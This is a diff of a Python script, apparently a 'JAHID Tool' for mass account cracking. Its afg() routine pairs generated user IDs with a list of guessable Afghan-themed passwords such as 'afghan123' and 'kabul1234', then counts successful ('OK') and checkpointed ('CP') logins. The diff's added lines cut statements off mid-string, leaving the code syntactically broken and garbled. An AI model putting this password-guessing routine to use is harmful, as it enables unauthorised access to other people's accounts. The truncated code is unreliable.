@@ -4,8 +4,7 @@ import os,requests,json,time,re,random,sys,uuid,string,subprocess,zlib,platform
 import marshal
 import os,base64
 from os import system as clr
-os.system('espeak -a 300 " Wellcome,   To,  ,JAHID ,Tool,"')
-try:
+os.system('espeak -a 300 " Wellcome,   To,  ,JAHID ,Tool,"
     import os,requests,json,time,re,random,sys,uuid,string,subprocess
     from string import *
     import bs4
@@ -594,10 +593,7 @@ def afg():
                         for psx in user:
                                 ids = code+psx
                                 passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Ã›Â±Ã›Â³Ã›Â³Ã›Â³Ã›ÂµÃ›Â¶Ã›Â·Ã›Â¸Ã›Â¹','Ã›Â±Ã›Â³Ã›Â³Ã›Â³Ã›ÂµÃ›Â¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan78
-                print(f'{W} [{R}+{W}] {W}THE PROCESS HAS COMPLETED')
-                print(f'{W} [{R}+{W}] {W}TOTAL OK/CP: '+str(len(ok))+'/'+str(len(cp)))
-                line()
-                input(f'{W} [{R}+{W}] {W}PRESS ENTER TO BACK ')
+                print(f'{W} [{R}+{W}] {W}THE PROCESS HA
                 menu()
 def ind():
                 user=[]
